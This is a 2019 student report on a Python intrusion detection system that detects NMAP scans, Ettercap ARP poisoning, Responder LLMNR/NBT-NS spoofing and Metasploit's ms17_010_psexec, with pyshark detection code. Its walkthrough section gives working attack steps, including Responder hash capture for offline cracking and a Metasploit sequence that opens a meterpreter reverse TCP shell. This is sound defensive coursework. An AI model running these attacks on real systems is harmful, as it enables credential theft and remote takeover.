---
title: "Python IDS Report"
author: [Jordan Sosnowski, Charles Harper, Tyler McGlawn, John David Watts]
date: "2019-12-12"
subject: "Python IDS"
keywords: [ids, python, heuristic, detection, nmap, ettercap, responder, ms17_010_psexec]
lang: "en"
titlepage: "true"
titlepage-rule-color: "FFFFFF"
titlepage-background: "./background8.pdf"
---
\newpage

# Executive summary

For this project we were tasked with producing a Python based intrusion detection system (IDS).
Our IDS is specifically a network based IDS, by that we mean the scanner is focused on the network communication rather than the processes running on a host.
Since the network we are running on is using a wired switch the IDS can only see traffic to or from the host it is running on.

The IDS implementation protects against NMAP's SYN Scans, ACK Scans, and XMAS Scans, Ettercap's ARP Poisoning, Responder's LLMNR and NetBIOS-NS Poisoning, Metasploit's ms17_010_psexec exploit.
We also use various types of detection systems to protect against attacks there are 4 covered: behavioral, anomaly, signature, and heuristic.

# Introduction

## I. Problem Description

Modern networks are constantly under attack from malicious agents whether it be malicious insiders, advanced persistent threats, nation state actors, hacktivist, you name it.
Data breaches can cost businesses hundreds of millions of dollars.
Therefore, it is extremely important to have good network security.
Breaches can have more than just economic repercussions.
Employees data can be leaked and with that their integrity can be compromised along with the loss in overall trust of the affected company.
To combat against these attacks it is imperative to have a network that is up to date and it is also important to analyze network traffic for attacks.
However, manually analyzing data streams is feasibly impossible especially for large networks.
To combat this intrusion detection systems can be used to slim down the amount of data analyst have to sift through.

<!-- pretty much rehashes what we have in the executive summary-->
This framework is a Python implementation for an Intrusion Detection System.
It aims to detect NMAP's SYN Scans, ACK Scans, and XMAS Scans, Ettercap's ARP Poisoning, Metasploit's ms17_010_psexec exploit, and Responder's LLMNR and NetBIOS-NS spoofing.
The framework uses different IDS methods to achieve this goal.

## II. Background

To fully understand some of the processes and applications discussed in this paper a background in these methodologies  needs to be established.

### 1. Intrusion Detection System

An intrusion detection system^[14]^ is software or device that analyzes network traffic for malicious activity.
Malicious activity is usually flagged, with the administrator of the network being notified of the incident.
IDS systems can also be configured to stop detected intrusions.

### 2. Network Based Intrusion Detection System

A network based IDS^[46]^ is an intrusion detection system that is focused on network communications between hosts on a network.
The opposite of a host based IDS is a **host based IDS** where the IDS is focused on logs produced by processes running on a host.
The downside for a network based IDS is while running on a switched network an IDS will only be able to see traffic destined to or from the host it is running on.
This is due to the fact that on switched networks the switch will only forward packets to the intended ports.
If it was a hub network, a Wi-Fi network, or the switch was configured to have a trunk port then a host based IDS would be able to see all the traffic on the network.
Also if traffic is encrypted the IDS will not be able to decipher it properly.

### 3. Behavior Based Detection

Behavior based detection^[15]^ analyzes traffic using a **known baseline**.
If the traffic is not close to this baseline the traffic will be flagged.
An example would be if a network is known to only have FTP traffic but for some reason there is now packets using SSH and SFTP traffic it should be flagged.
Of course in this example a user could have spun up a box that uses SSH or SFTP but since the baseline is used to seeing only FTP it is abnormal traffic.

### 4. Anomaly Based Detection

Anomaly based detection^[13]^ attempts to find abnormal **protocol** activity.
Protocols adhere to strict guidelines, most are defined in RFCs.
If for instance, there is traffic on a network that shows a protocol not adhering to its normal activity it should be flagged.
This is different from a behavior IDS because it is focused on **protocol** activity while behavior is focused on looking at what is **normal** for a network.

### 5. Signature Based Detection

Signature based detection^[12]^ searches network traffic for **specific patterns**.
Malicious traffic usually has telltale signs, and if these **signs** are seen in packets they should be flagged as malicious.
If for instance it is known that a recent strain of a popular malware communicate with a server *www.bad_malware.com* on port *8080* then any packets destined to this address and port should be flagged.

### 6. Heuristic Based Detection

Heuristic based detection^[11]^ uses algorithms or **simple rules** to determine compromise.
Can combine signature, anomaly, and behavior tactics.
For example it would be odd for a single IP to scan multiple different ports with a payload of zero data.
A simple rule could check and see if a unique IP has more than 20 unique destination ports plus using the signature of length zero data packets.
If this rule is triggered one can assume it is malicious.

### 7. NMAP

NMAP^[10]^ is a free and open-source network scanner and mapper tool used **both** by information security experts and malicious users.
NMAP provides a huge number of features for scanning and probing networks.

### 8. Ettercap

Ettercap^[9]^ is a 'multipurpose sniffer/content filter' for **man in the middle attacks**.
It was originally created as a sniffer for switched LANs, but evolved into a tool meant for man-in-the middle-attacks.

### 9. ARP Poisoning

ARP poisoning^[47]^ is an attack that takes advantage of the communication method of the Address Resolution Protocol (ARP).
ARP is used for mapping an internal LAN network.
Each host has what is known as an 'ARP Table' where they keep track of internal ip addresses and the MAC address of that particular ip address.

The reason for the ARP protocol is to help route packets or frames to an individual host.
When trying to route messages internally, computers will ask who has a specific IP address.
This request is broadcasted across the **entire** network. If a computer has the associated IP address, they will reply to that message with their MAC address.
The key points to keep in mind in this communication is that these messages are **broadcasted** and are **not** verified.
ARP poisoning takes advantage of this by first discovering all of the hosts, mapping the network, and determining which hosts are **active**.
Once the attacker has selected a victim machine, they send replies to ARP requests for the victim machine's IP address - these are known as 'Gratuitous ARP' messages.
No machine has requested these, but because ARP can not verify if the host sending these messages is who they say they are the attacker can get away with the attack.
ARP also will trust that if an IP does not match its internal ARP table that the host has been updated and will **overwrite** the old ARP record.

By sending these messages, the attacker is *poisoning* the ARP tables of the network and more importantly the gateway or router of the network.
When messages intended for the victim machine arrive in the network, they are routed to the attacker instead of the victim!
From this position, the attacker can perform several different attacks including but not limited to sniffing all of the traffic intended for the victim, hijacking any session the victim had, or modifying their traffic.

### 10. Responder

Responder^[18]^ is a tool that allows us to use **LLMNR**, **NBT-NS**, and **MDNS poisoning**.
What this means is that we can use an LLMNR and NBT-NS Spoofing attack against a network.
This sort of attack takes advantage of default Windows configurations in order to achieve its end goal.

### 11. Link-Local Multicast Name Resolution (LLMNR)^[16]^

LLMNR^[16]^ is protocol based on the Domain Name System packet format that allows hosts to perform **name resolution** for hosts on the same local link.

### 12. NetBIOS-NS (NBT-NS)

NBT-NS^[17]^ is a name service provided by **NetBIOS** that provides **name registration** and resolution.
Identifies the systems on a local network by their NetBIOS name.

### 13. NetBIOS

NetBIOS^[19]^ provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network.

### 14. Metasploit

Metasploit^[20]^ is a Ruby-based open source **penetration testing framework**, that allows for a systematic vulnerability probe into a network.
It is operated via a command line interface or graphical user interface, that allows the user to choose the target, exploit, and payload to use against the target system.
This framework gives user the ability to choose from one of the many pre-configured exploits/payloads, or use a custom exploit/payload.

### 15. MS17-010 / CVE-2017-014X

The MS-010 security update^[39]^ corrects the multiple **SMB vulnerabilities** discovered in Microsoft Windows that could allow for remote access to a system.
Each exact vulnerability is detailed in CVE-2017-0143^[40]^, CVE-2017-0144^[41]^, CVE-2017-0145^[42]^, CVE-2017-0146^[43]^, CVE-2017-0147^[44]^, and CVE-2017-0148^[45]^.

### 16. Admin$

Admin$^[36]^ is a hidden share that is on all NT versions of windows. It allows administrators to **remotely access** every disk on a connected system.

### 17. Distributed Computing Environment / Remote Procedure Calls(DCE/RPC)

DCE/RPC^[34]^ is a remote procedure that allows the writing of software as if working on the computer.

### 18. Service Control Manager(SCM)

SCM^[33]^ is a system process under Windows NT systems that starts and stops Windows processes.

### 19. Managed Object File(MOF)

Simplified, managed object files^[32]^ contain data that corresponds to events to do.

# Methods

## I. Attack Explanations

We will now discuss how the different attacks work.
Understanding why and how attacks work is critical for detecting them.

### 1. NMAP ACK Scan

This scan^[2]^ is different than the other two scans discussed in this report.
Its main purpose is to map out if a firewall is active and filtering certain ports or not.
If a system is **unfiltered**, not running a firewall, **open** and **closed** ports will return a *RST* packet.
However, if a system is **filtered**, running a firewall, ports will not respond at all.
This type of scan **will not** detect if ports are open or closed.

The NMAP attacks by themselves are not too dangerous, especially compared to the other attacks.
However knowing which ports are open / closed / filtered is the starting point for almost every attack.
Due to the knowledge gained by these scans one can craft tailored attacks.

![ACK Packets](img/nmap/ack_packets.png)

### 2. NMAP SYN Scan

This scan^[2]^ is the default scan for NMAP scanning.
The SYN scan is rather fast and stealthy due to the fact that if never completes a full TCP handshake.
NMAP will send a *SYN* packet and an **open** port will respond with a *SYN/ACK* while a **closed** port will send a *RST*.
If no response is returned it is assumed the port is **filtered**.

![SYN Packets](img/nmap/syn_packets.png)

### 3. NMAP XMAS Scan

This scan^[2]^ exploits a behavior built into RFC 793^[21]^  to differentiate between open and closed ports.
"If the [destination] port state is **CLOSED** ... an incoming segment not containing a *RST* causes a *RST* to be sent in response" and. Therefore no response will mean that the port is either **open** or **filtered**.
The XMAS Scan sets the *FIN*, *PSH**, and *URG* flags.

![XMAS Packets](img/nmap/xmas_packets.png)

### 4. Ettercap's ARP Poisoning

Ettercap^[3]^ was originally intended to be used for packet sniffing on LAN networks but has evolved into a tool used primarily for man-in-the-middle attacks.
One of the most common man-in-the-middle attacks, and one provided by Ettercap, is ARP poisoning.

We will now walk you through the process of ARP poisoning with Ettercap.
The first thing Ettercap does is it scans the network for active hosts.
Below you can notice several ARP requests in a row all coming from the same host- this is the host discovery step.

![Host Discovery](img/ettercap/HostDiscoveryPackets.PNG)

From the list of active hosts the attacker selects a victim- this is the machine they will pretend to be. The attacker machine sends out gratuitous ARPs claiming that they are the machine associated with an ip address that they are sitting on.

![Gratuitous ARPs](img/ettercap/GratuitousArpPackets.PNG)

The IP address they are claiming to be actually belongs to the victim machine. This message, the gratuitous ARP, is broadcasted on the network, so all the machines listening and learning the network hear it and assume it's true.
All of the machines on the network log this information in their ARP tables, and now when traffic is routed to that ip address, it is routed to the attacker machine instead of the victim host.

This attack inherently is not extremely dangerous but it will damage the integrity and confidentiality of a network.
Now all traffic destined to a machine will be going through the attackers box allowing them to see all the information destined to the victim.
However, if the traffic is encrypted the attacker will not be able to see any of it.

### 5. Responder

Out of all the other attacks Responder is by far the most complicated and the one of the ones with the most background knowledge.
The other being the metasploit exploit.
Responder uses an LLMNR and NBT-NS spoofing to poison a network.
It is important to understand what a LLMNR and NBT-NS server broadcasts in order to understand how this kind of attack works.
When a DNS server request **fails**, Microsoft Windows systems use Link-Local Multicast Name Resolution (LLMNR) and the Net-BIOS Name Service (NBT-NS) for a “fallback” name resolution.
This poses a huge threat as if the DNS name is not resolved.
If it is not resolved the client (aka the victim in this scenario) performs an unauthenticated UDP broadcast to the network asking all other systems if it has the name that it is looking for.
Any machine on the network can respond to this and claim to be the target machine.

Now that we understand the background of this process, we will proceed to dive deeper on just how an LLMNR and NBT-NS Poisoning Attack works.
First, the attacker must be actively listening for LLMNR and NetBIOS broadcasts and if this is the case, then it can hide itself on the network to proceed onto pretending as the machine that the victim wants to connect to.
Once the attacker accepts the connection from the spoofed machine, we can then use this spoofed machine (our attacking machine pretending to be who the victim is looking for) to run the Responder tool and forward the request to a rogue service that performs the authentication process.
While this authentication is taking place, the client will send the spoofed machine a NTLMv2 hash for the user that it is trying to authenticate.
If we can capture this hash, it can be cracked offline of the network with a few of the tools that we have learned this semester such as: <hashcat or John the Ripper.
A figure of this entire process is shown below to aid your understanding of what kind of attack we are going to perform with the responder tool.

![Basic attack where a user mistypes the server name](img/responder/basic_attack.png)

This type of exploit is extremely dangerous because it is not due to some inherent vulnerability.
It is exploiting how LLMNR and NBT-NS works.
If a user needs to login to **theshare** but types in **tehshare** this attack will work.
This attack can also succeed if the networks DNS server is down for some reason.
One the spoofing starts a user most likely will not realize there is an issue and will type in their login credentials.
If this were to happen to a system admin the attacker would have the admins credentials, they are hashed but with enough time and if the password's strength is poor the attacker can now have admin access to this network.

### 6. Metasploit's ms17_010_psexec

Metasploit's ms17_010_psexec^[22]^ exploit is a combination of exploits consisting of the ms17_010 exploit and the psexec exploit.
ms17_010_psexec first uses the ms17_010 exploit to gain access to system, then the psexec exploit to drop a payload.

The ms17_010 exploit uses the SMB vulnerabilities described in CVE-2017-0143, CVE-2017-0146, and CVE-2017-0147.
It uses these vulnerabilities to gain the ability to write-what-where in an attempt to overwrite the current session as an Administrator session.
This is achieved by exploiting  the type confusion between **Transaction** requests and **WriteAndX** requests.
Once the Administrator session has been completed the psexec exploit is then initialized.

If Powershell is detected on the host system, the executable will attempt to run a Powershell command with the payload embedded.
If Powershell is not detected on the system, the psexec exploit will attempt to place the payload on the system under the SYSTEM32 directory, then execute the payload.
It is allowed to do this due to the Administrator session that was previously obtained.
The psexec exploit packages code and a payload as an executable and using the Administrator session previously obtained, accesses the Admin$ share.
After accessing the Admin$ share, psexec then connects to the Distributed Computing Environment / Remote Procedure Calls (DCE/RPC) and remotely calls into the Service Control Manager(SCM) to run the executable.

However, if those fail there is a third way to attempt a connection.
It is the Managed Object File(MOF) method.
This method will only work on Windows XP and Windows Server 2003 so we did not use it in our demonstrations below.
The MOF method works by adding the payload under the SYSTEM32 directory and placing a MOF file under the SYSTEM32\\wbem\\mof\\ directory.
Upon discovery of the MOF, windows will run the file which will execute the payload.

Out of all the attacks discussed so far this is by far the most dangerous as one can gain direct access to a system using this exploit.

## II. Attack Walkthrough

Now we will go through how you can set up these attacks.
Using data created by actual attacks can be very valuable in creating an IDS.

### 1. NMAP ACK Scan

The NMAP Scans are by far the most trivial to setup.

* First install NMAP
  * Debian Based Systems:
    * `sudo apt install nmap -y`
  * Mac:
    * `brew install nmap`
  * Windows:
    * `choco install nmap`
* Figure out the IP or IP ranges you wish to scan
* Ensure you are on the network about to be scanned, or can access it
* Run `nmap -sA [ip]`
  * `nmap -sA 192.168.5.10`
  * `nmap -sA 192.168.5.0/24`

![ACK Scan](img/nmap/nmap_ack.png)

### 2. NMAP SYN Scan

For a SYN scan the first three steps are the same, ensure NMAP is installed, and figure out the IP/IP ranges.

* Run `nmap -sS [ip]`
  * `nmap -sS 192.168.5.10`
  * `nmap -sS 192.168.5.0/24`

*Note: SYN Scans are the default scan in nmap so technically you could just run `nmap ip`*

![SYN Scan](img/nmap/nmap_syn.png)

### 3. NMAP XMAS Scan

For a XMAS scan the first three steps are the same, ensure NMAP is installed, and figure out the IP/IP ranges.

* Run `nmap -sX [ip]`
  * `nmap -sX 192.168.5.10`
  * `nmap -sX 192.168.5.0/24`

![XMAS Scan](img/nmap/nmap_xmas.png)

### 4. Ettercap

* First install Ettercap
  * Debian Based Systems:
    * `sudo apt install ettercap -y`
  * Mac:
    * `brew install ettercap`
  * Windows:
    * `choco install ettercap`

* Connect to the network that you will be targeting

* Open ettercap on the attacking machine
  * `ettercap -G`

![Ettercap GUI](img/ettercap/ettercap_gui.PNG)

* Select the interface that will be used during the attack
  * To find this we run ifconfig on our attacker machine, and find the interface associated with the network we are sitting on:
    * In our case, we find that the interface is listed as 'eth0'
  * Select this from the 'unified sniffing' option under the 'Sniff' tab

![Sniff Tab](img/ettercap/SniffingTab.PNG)

![Interface Selection](img/ettercap/UnifiedSniffingInterfaceSelection.PNG)

* Identify hosts
  * Ettercap has a host discovery function where it sends arp requests for the range of ip on the subnet. With those we find 9 different hosts:

![Host Discovery](img/ettercap/HostDiscoveryDropdown.PNG)

![Host Discovery](img/ettercap/discovered_hosts.PNG)

* Select Hosts to target with ARP spoofing
  
  * Next, from the host list, we add the target ip address to 'target 1' and then go to the target list under the target tab
  
  * From there we highlight the target, navigate the the 'MITM' tab, select ARP Poisoning, and then select the first option, 'sniff remote connections' and let the program do what it does best.

![Target Selection](img/ettercap/TargetSelection.PNG)

![MITM Selection](img/ettercap/MITMSelection.PNG)

![ARP Poisoning Options](img/ettercap/ARPPoisoningParameterSelection.PNG)

### 5. Responder

* First install responder
  * `git clone https://github.com/SpiderLabs/Responder.git`
  * `cd Responder/`

After that we need to go ahead and get Responder running on our attack machine.
We can do this by running the command: `Responder.py -I eth0 -wrFb`

![Setup Responder](img/responder/responder.png)

Once we have Responder up and running on our attack machine, we can navigate over to our Windows 7 victim machine (.201) and open up the File Explorer.
Once here we can click on the top toolbar and enter in ‘\\\\abc’ to simulate a user tying the wrong SMB server name.

![Improper DNS](img/responder/improper_dns.png)

Once the user types in the wrong server name, the DNS lookup fails and therefore our attack begins.
One we have pressed the ‘Enter’ key after typing this command in the toolbar we can see our Kali Machine with Responder running in the background begins to execute its attack and the only thing we are prompted to do is enter in a username and password on the Windows 7 machine but it does not matter if we do or not because our attack has already taken place.

![Listening](img/responder/listening.png)

Navigating over back over to our Kali Machine and into the ‘/usr/share/responder/logs/ directory we can see that we have generated a new file called ‘SMBv2-NTLMv2-SSP-192.168.150.201.txt’.
Looking at this file using the cat command, we can see that it contains a long hash. By using either hashcat or john the ripper, we can crack this hash to therefore obtain the username and password to the system.

![Logs](img/responder/logs.png)

### 6. ms17_010_psexec

* Assuming we are already on a machine with Metasploit and that we already know who our target is, these are the steps to use ms17_010_psexec
* Open Metasploit
  * `msfconsole`
* Use the ms17_010_psexec exploit for our attack
  * `use exploit/windows/smb/ms17_010_psexec`
* Set the payload, your choice. We used the meterpreter reverse tcp shell
  * `set payload windows/x64/meterpreter/reverse_tcp`
* Set the target
  * `set RHOSTS 'TARGET'`
* Set the attackers address
  * `set LHOST 'Attacker Address'`
* Set the port to attack from, we use 80 because it is least likely to be blocked because of http traffic.
  * `set LPORT 80`
* Run the attack
  * `run`

As you can see from the image below, it is very easy to use this attack:

![Initializing ms17_010_psexec](img/ms17_psexec/Running_ms17_010_psexec.png)

## III. Code Walkthrough

### 1. Sniffer

Our first module that was built was the sniffer module.
`sniffer` is used in all of the IDS detection modules.
This module uses *Pyshark*, a python wrapper for shark which is the terminal version of *Wireshark*, to sniff traffic.
`get_capture` takes in either a file and an arbitrary amount of named parameters which are all grabbed by  **kwargs^[1]^.
If a file is passed `_read_cap` is called else `_sniff` is called.

```python
def get_capture(file=None, **kwargs):
    if file:
        capture = _read_cap(file)
    else:
        capture = _sniff(**kwargs)
    return capture
```

`_read_cap` is quite trivial. It uses *Pyshark's* `FileCapture` to read in a **pcap** and return a capture object. The capture object is essentially a list of packets from the pcap.

```python
def _read_cap(in_file):
    cap = pyshark.FileCapture(in_file)
    return cap
```

`_sniff` is a little bit more complex.
It takes in four arguments: **interface**, **timeout**, **continuous**, and **out_file**.
**interface** is a string that relates to the interface on the machine that you want to sniff on.
If an interface is not provided then `choose_interface` will be called.
**timeout** is an integer that represents how many packets you would like to capture.
**continuous** is a boolean, that if True allows you to capture continuously instead of just a number of packets.
**out_file** is a string, that if provided, will allow the user to output their capture to a pcap.

```python
def _sniff(interface=None, timeout=10, continuous=True, out_file=None):
    if not interface:
        interface = choose_interface()

    if out_file:
        capture = pyshark.LiveCapture(output_file=out_file,
                                      interface=interface)
    else:
        capture = pyshark.LiveCapture(interface=interface)

    if continuous:
        capture.sniff_continuously()
    else:
        capture.sniff(timeout=timeout)

    return capture
```

`choose_interface` is a utility function that aids a user if they do not know their network adapter' names.
It uses a python module called *Netifaces* to list all the network interfaces on a machine.
On Windows it is a little bit more complicated.
Windows machines will respond with **GUIDs** that relate to registry keys instead of adapter names like `eth0` or `en0`.
However, doing registry lookups with *Winreg*, a builtin module found only on Windows machines, one can recover the adapter names.
After the adapter names are enumerated the user will be prompted to select which adapter they would like to sniff on.

```python
def choose_interface():
    interfaces = netifaces.interfaces()

    if os.name == 'nt':

        iface_names = ['(unknown)' for i in range(len(interfaces))]
        reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)
        reg_key = wr.OpenKey(
            reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
        for counter, interface in enumerate(interfaces):
            try:
                reg_subkey = wr.OpenKey(
                    reg_key, interface + r'\Connection')

                iface_names[counter] = wr.QueryValueEx(reg_subkey, 'Name')[0]
            except FileNotFoundError:
                pass
        interfaces = iface_names

    print('Select Interface: ')

    for val, count in enumerate(interfaces):
        print(val, count)

    selection = int(input())

    return interfaces[selection]
```

### 2. IDS NMAP

`ids_nmap` provides detection against NMAP's XMAS Scans, ACK Scans, and SYN Scans.
`xmas_signature_detection` takes in file and an arbitrary amount of named arguments. These arguments are both passed to `sniffer.get_capture`.
The capture object that is returned by the prior call is then iterated through.
XMAS attacks use TCP Packets that use TCP Flags: FIN, RES, and PSH.
Therefore our detection first checks to see if the packet is using TCP and if it is then it checks to see if the correct flags are set.
Benign traffic does not set these flags so if they appear its most likely an XMAS scan.

```python
def xmas_signature_detection(file=None, **kwargs):
    capture = sniffer.get_capture(file, **kwargs)
    detected = False

    for packet in capture:
        if packet.transport_layer == 'TCP':
            if int(packet.tcp.flags, 16) == 41:
                print(f'XMAS ATTACK in packet number: {packet.number}')
                detected = True
    return detected
```

For `ack_heuristic_detection` we take in the same parameters and pass them to `sniffer`.
The idea behind an ACK Scan is that the scanning machine will probe every port for a specific machine and set only the **ACK TCP flag**.
Setting the ACK TCP flag and only that flag is *not abnormal behavior* in of itself.
However, doing this to *multiple unique ports* is quite suspicious.
Therefore, for our implementation we look at TCP packets and log all the unique ports every IP probes with only the ACK TCP flag set.
If this counter passes a predefined value, which we have set to 10, it is flagged.

```python
def ack_heuristic_detection(file=None, **kwargs):
    capture = sniffer.get_capture(file, **kwargs)
    uniq_ip = collections.defaultdict(set)
    detected = False

    for packet in capture:
        if packet.transport_layer == 'TCP':
            if int(packet.tcp.flags, 16) == 16:  
                uniq_ip[packet.ip.addr].add(packet.tcp.dstport)
                if len(uniq_ip[packet.ip.addr]) > MAX_UNIQUE_PORTS:
                    print(f'ACK ATTACK in packet number: {packet.number}')
                    detected = True

    return detected
```

The same idea is applied to `syn_heuristic_detection`. Here, however, we are looking for SYN scans.
Which are similar to ACK scans. Except SYN scans only set the *SYN TCP flag*.
Using the same logic as before we can detect these types of scans.

```python
def syn_heuristic_detection(file=None, **kwargs):
    capture = sniffer.get_capture(file, **kwargs)
    uniq_ip = collections.defaultdict(set)
    detected = False

    for packet in capture:
        if packet.transport_layer == 'TCP':
            if int(packet.tcp.flags, 16) == 2:
                uniq_ip[packet.ip.addr].add(packet.tcp.dstport)
                if len(uniq_ip[packet.ip.addr]) > MAX_UNIQUE_PORTS:
                    print(f'SYN ATTACK in packet number: {packet.number}')
                    detected = True

    return detected
```

### 3. IDS Ettercap

Another type of attack we aim to detect against is Ettercap's ARP poisoning.
`heuristic_detection` takes in the same parameters as seen before and passes it to `sniffer`.
`heuristic_detection` checks for suspicious activity in the network traffic by looking for the host discovery process used by Ettercap when setting up an arp poisoning attack.
The way we have implemented this scan is by counting the number of **consecutive ARP requests** made by a specific host.
If the number of consecutive arp requests made by the same host exceeds a set threshold value, the ids alerts the host machine, and returns a warning.

```python
def heuristic_detection(file=None, **kwargs):
    capture = sniffer.get_capture(file, **kwargs)
    was_detected = False
    host_in_question = ""
    concurrent_arp_req_count = 0
    request = '1'
    reply = '2'

    for packet in capture:
        if 'arp' in packet:
            if packet.arp.opcode == request:
                if host_in_question == "":
                    host_in_question = packet.eth.src
                elif host_in_question == packet.eth.src:  
                    concurrent_arp_req_count += 1
                else:
                    host_in_question = packet.eth.src
                    concurrent_arp_req_count = 0
                if concurrent_arp_req_count >= ARP_REQ_THRESHOLD:
                    print("ARP POISONING DETECTED!!! FLAGGED PACKET:", packet.number)
                    was_detected = True
    return was_detected
```

`behavioral_detection` checks for suspicious activity in the network traffic by checking for gratuitous ARP replies.
The way we have implemented this scan is by counting the number of ARP replies and ARP requests.
With normal traffic, **more ARP requests** are made than ARP replies. With the counted number of request and replies, we examine the ratio between the two.
If e number of request far exceeds the number of replies, we know that a host is making gratuitous ARP packet.
We flag the packets deemed as gratuitous ARPs and alert the host machine.

```python
def behavioral_detection(file=None, **kwargs):
    capture = sniffer.get_capture(file, **kwargs)
    was_detected = False
    previous_arp_type = None
    current_arp_type = None
    concurrent_arp_reply_count = 0
    request = '1'
    reply = '2'

    for packet in capture:
        if 'arp' in packet:
            current_arp_type = packet.arp.opcode
            if current_arp_type == reply:  y
                if previous_arp_type == request: 
                    previous_arp_type = current_arp_type
                    concurrent_arp_reply_count = 0
                else: 
                    concurrent_arp_reply_count += 1
                    if concurrent_arp_reply_count > CONCURRENT_ARP_REPLY_THRESHOLD: 
                        print(
                            "GRATUITOUS ARP DETECTED!!! FLAGGED PACKET:", packet.number)
                        was_detected = True
            else:  
                previous_arp_type = request
    return was_detected

```

### 4. IDS Responder

Responder's spoofing is one of the last attacks we are trying to protect against.
Responder uses LLMNR, NBT-NS, and MDNS poisoning attacks.
Essentially, we can use these kind of spoofing attacks against a network when a victim sends a bad DNS requests to a server.
Once this bad request has been sent, we act as a 'Man-in-the-Middle' and our Kali machine acts as the machine that the victim wants to connect to.
Once this connection has been made, we get the SMB.txt file from the client and we can therefore crack this hash offline to get valuable information about the victim machine.
In our code we assume that **one machine** on the network has been setup to be the domain controller.
Therefore if traffic is seen from an IP that is not the domain controller on specific protocols, NBNS and LLMNR, that only the domain controller should be sending on we assume responder is trying to spoof the network.

Note: The hard coded **DOMAIN_IP** will need to be changed per network as it will not always be the same.

```python
DOMAIN_IP = '192.168.150.201'  

def behavioral_detection(file=None, **kwargs):

    capture = sniffer.get_capture(file, **kwargs)
    detected = False

    for packet in capture:
        try:
            if ('nbns' in packet or 'llmnr' in packet) and packet.ip.src != DOMAIN_IP:
                print(
                    f'Responder ATTACK detected in packet number: {packet.number}')
                detected = True
        except AttributeError:
            pass
    return detected
```

### 5. IDS ms17_010_psexec

The last attack that we are determined to detect is the Metasploits ms17_010_psexec attack.
`signature_detection` takes in the same parameters as previously seen, and passes them to `sniffer.get_capture`.
`signature_detection` then begins to watch traffic over the network via the capture object.
It does this by looking through every packet on the network and seeing if there are any SMB files in the packet.
If there are SMB files, it then attempts to look at the path and sees if it is attempting to access the **ICP$** or **ADMIN$** shares.
Normal SMB traffic **does not** attempt to set the path to the ICP$ or ADMIN$ shares.
Therefore, if it they are in the path to be used, we flag the packet.

```python
def signature_detection(file=None, **kwargs):

    capture = sniffer.get_capture(file, **kwargs)
    for packet in capture:
        if('SMB' in packet):
            smb = packet.smb
            if("path" in dir(smb)):
                path = smb.path
                if(("IPC$" in path) or ("ADMIN$" in path)):
                    print("MS_010_psexec detected in packet:" + str(packet.number))

```

## IV. Detection

Here we discuss how to setup our IDS system and show it working against live attacks.

### 0. Setup

Before running any of the detections you must ensure the framework is setup properly

* Ensure Python 3 is installed
  * If you are running on a *NIX system or Mac it should be installed by default
    * Run `python3 -V` to double check
    * If that command fails try `python -V`, as long as the version is greater than 3.6 the program will work
      * On most systems `python` is Python 2, but some newer ones no longer come with Python 2.
  * To install python 3 run
    * Debian Based
      * `sudo apt install python3 python3-pip -y`
    * Mac:
      * `brew install python3`
      * `sudo easy_install pip`
    * Windows:
      * `choco install python3`
* Ensure Wireshark is installed
  * Debian Based
    * `sudo apt install wireshark -y`
  * Mac:
    * `brew cask install wireshark`
  * Windows:
    * `choco install wireshark`
* Install Python dependencies
  * Make sure you are in the root directory for this project
  * `pip3 install -r requirements.txt`
* Ensure the hard coded IP in `src/ids_responder.py` is correct for your network.

### 1. Running the IDS

Simply run `python3 src/ids.py {interface}` to start the IDS.
It will prompt you for the interface you want to listen on or you can pass it as a command line argument.
It will automatically sniff for all types of attacks.
Currently we do not have it so you can pick and choose which attacks to listen for.

### 2. NMAP ACK Scan

Demonstrating our ability to detect NMAP scans we ran our IDS on an Ubuntu virtual machine and the attacks on a Kali virtual machine.

Below are pictures showing the IPs for these two boxes.

![Kali IP](img/nmap/kali_ip.png)

![Ubuntu IP](img/nmap/ubuntu_ip.png)

The below figure illustrates our IDS to detect NMAP ACK scans performed against the running machine.

![ACK Detection](img/nmap/ack_detection.png)

### 3. NMAP SYN Scan

For SYN scans we used the same setup as the ACK scan.
The below figure illustrates our IDS to detect NMAP SYN scans performed against the running machine.

![SYN Detection](img/nmap/syn_detection.png)

### 4. NMAP XMAS Scan

For XMAS scans we used the same setup as the ACK and SYN scan.
The below figure illustrates our IDS to detect NMAP XMAS scans performed against the running machine.

![XMAS Detection](img/nmap/xmas_detection.png)

### 5. Ettercap

To demonstrate our IDS's ability to detect Ettercap ARP Poisoning, we ran our IDS while performing an ARP Poisoning on a test network.
The steps we went through to perform said attack are listed in the 'Attack Walkthrough' section.

The first step to a successful ARP Poisoning is host discovery.

![Host Discovery Detection](img/ettercap/HostDiscoveryDetection.PNG)
This figure illustrates our IDS detecting ARP Poisoning when performing host discovery with Ettercap.
On the left, Ettercap is performing the host discovery task, and on the right we have our IDS system running the heuristic scan.
One can note several messages warning the user of ARP POISONING and altering them to the packet that flagged the warning.

Next, we started sniffing traffic, and pushing gratuitous ARPs onto the network- performing ARP Poisoning.

![Gratuitous ARP Detection](img/ettercap/GratuitousArp.PNG)
This figure illustrated our IDS detecting Gratuitous ARPs while on a live network. On the left one can note the 'Target' tab of Ettercap. the host '192.168.35.20' is the target of the ARP poisoning. To the right of that, you'll notice our IDS running the behavioral ARP scan.
The IDS is successfully detecting the gratuitous ARPs, which are sent less frequently than the requests seen during host discovery.
The IDS alerts the user of the gratuitous ARP and returns the packet number that created the warning.

### 6. Responder

For this process we are going to use the lab machines to show that an attack against the Windows 7 machine (.200) from the Kali Machine (.10).
As stated previously we are going to use the responder tool in Kali Linux to perform an ‘Man-in-the-Middle’ attack by intercepting the traffic flow from a bad DNS server call from the Windows 7 machine.
Once we send an LLMNR or a NETBIOS broadcast from the Kali Machine, the Windows 7 machine will accept this broadcast.
Once this broadcast has been accepted, our attacker will grab a file named ‘SMBv2-NTLMv2-SSP-192.168.150.201.txt’ in which we can decrypt in order to see the username and passwords.

Now that we know what exactly will happen on the network, we can easily see how our IDS needs to be implemented in order to help prevent this attack.
To prevent this attack, all we need to check for is if the source IP address is not the source IP addresses of the DNS server or the Windows 7 machine which we will already know as we are familiar with what network we are on.
If this source IP address is not the Windows 7 machine (192.168.x.201) or the DNS server we are trying to connect to, then we need to check what source is sending packets.
For this instance, our behavioral IDS checks to see that the source equals 192.168.x.201, if it does not match, then we send a message to the user saying that there is an issue.
These checks are done on both NBNS protocols and LLMNR protocols as shown below.

![LLMNR Detection](img/responder/LLMNR_detection.png)

![NBNS Detection](img/responder/NBNS_detection.png)

### 7. ms17_010_psexec
